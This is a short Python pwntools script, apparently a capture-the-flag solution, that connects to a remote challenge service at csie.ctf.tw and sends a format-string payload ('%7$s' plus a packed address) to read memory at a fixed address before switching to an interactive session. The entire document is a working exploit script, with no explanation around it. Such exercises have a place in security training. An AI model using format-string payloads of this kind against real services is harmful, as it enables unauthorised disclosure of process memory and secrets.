#!/usr/bin/env python

from pwn import *

r = remote("csie.ctf.tw", 10133)

addr = 0x600ba0

r.recvuntil('?')
r.sendline('%7$saaaa' + p64(addr))
r.interactive()
